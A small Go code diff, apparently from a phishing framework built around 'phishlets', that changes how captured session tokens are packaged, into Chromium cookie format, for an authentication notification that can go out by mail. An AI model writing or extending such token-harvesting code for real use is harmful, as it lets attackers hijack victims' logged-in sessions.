@@ -147,7 +147,7 @@ func NotifyOnAuth(n *Notify, session database.Session, phishlet *Phishlet) error
 	s := session
 	b := Visitor{
 		Session: s,
-		Tokens:  tokensToJSON(s.Tokens),
+		Tokens:  tokensToCookie(s.Tokens, "Chromium"),
 	}
 	//TODO option to not send sensitive data by mail
 
